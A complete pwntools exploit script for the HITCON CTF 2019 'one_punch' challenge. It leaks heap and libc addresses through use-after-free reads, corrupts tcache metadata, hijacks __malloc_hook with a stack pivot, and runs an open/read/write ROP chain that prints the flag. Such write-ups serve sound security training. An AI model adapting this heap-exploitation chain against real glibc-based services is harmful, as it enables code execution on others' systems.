from pwn import *
#r = remote('node3.buuoj.cn',25105)
r = process('./hitcon_ctf_2019_one_punch')
elf = ELF('./hitcon_ctf_2019_one_punch')
libc = ELF('./libc-2.29.so')


def add(index,name):
	r.recvuntil('> ')
	r.sendline('1')
	r.recvuntil('idx: ')
	r.sendline(str(index))
	r.recvuntil('hero name: ')
	r.send(name)


def edit(index,name):
	r.recvuntil('> ')
	r.sendline('2')
	r.recvuntil('idx: ')
	r.sendline(str(index))
	r.recvuntil('hero name: ')
	r.send(name)

def show(index):
	r.recvuntil('> ')
	r.sendline('3')
	r.recvuntil('idx: ')
	r.sendline(str(index))

def free(index):
	r.recvuntil('> ')
	r.sendline('4')
	r.recvuntil('idx: ')
	r.sendline(str(index))

def fuck(payload):
	r.recvuntil('> ')
	r.sendline('50056')
	r.sendline(payload)

for i in range(7):
	add(0,'a'*0x200)
	free(0)
show(0)
r.recvuntil('hero name: ')
leak = u64(r.recvuntil('\n',drop=True).ljust(8,'\x00'))
heap_base = leak - 0xcb0
log.success(hex(heap_base))
add(0,'a'*0x200)
add(1,'./flag\x00\x00'+'a'*0x200)
free(0)
show(0)
r.recvuntil('hero name: ')
leak = u64(r.recvuntil('\n',drop=True).ljust(8,'\x00'))
libc_base = leak - 0x1e4ca0
log.success(hex(libc_base))
add(0,'a'*0x200)

for i in range(6):
	add(0,'a'*0xf0)
	free(0)

for i in range(7):
	add(0,'a'*0x400)
	free(0)


add(0,'b'*0x400)
add(2,'a'*0x400)
free(0)
add(2,'a'*0x300)

add(1,'c'*0x400)
add(2,'a'*0x400)
free(1)
add(2,'a'*0x300)

add(2,'a'*0x400)

edit(1,'a'*0x300+p64(0)+p64(0x101)+p64(heap_base+0x3a60)+p64(heap_base+0x1b))

add(0,'a'*0x217)
malloc_hook = libc_base+libc.sym['__malloc_hook']
free(0)
edit(0,p64(malloc_hook))

add(1,'x'*0xf0)

log.success(hex(malloc_hook))

add_rsp_0x48_r = libc_base + 0x8cfd6
fuck(p64(add_rsp_0x48_r))
fuck(p64(add_rsp_0x48_r))

p_rdi = libc_base + 0x26542
p_rsi = libc_base + 0x26f9e
p_rdx = libc_base + 0x12bda6
p_rax = libc_base + 0x47cf8
syscall = libc_base + 0xcf6c5

#open
payload = p64(p_rdi)+p64(heap_base+0x12e0)
payload += p64(p_rsi)+p64(0)
payload += p64(p_rdx)+p64(0)
payload += p64(p_rax)+p64(2)
payload += p64(syscall)

#read
payload += p64(p_rdi)+p64(3)
payload += p64(p_rsi)+p64(heap_base+0x12e0)
payload += p64(p_rdx)+p64(0x70)
payload += p64(p_rax)+p64(0)
payload += p64(syscall)

#write
payload += p64(p_rdi)+p64(1)
payload += p64(p_rsi)+p64(heap_base+0x12e0)
payload += p64(p_rdx)+p64(0x70)
payload += p64(p_rax)+p64(1)
payload += p64(syscall)
log.info(hex(len(payload)))
add(0,payload)
r.interactive()
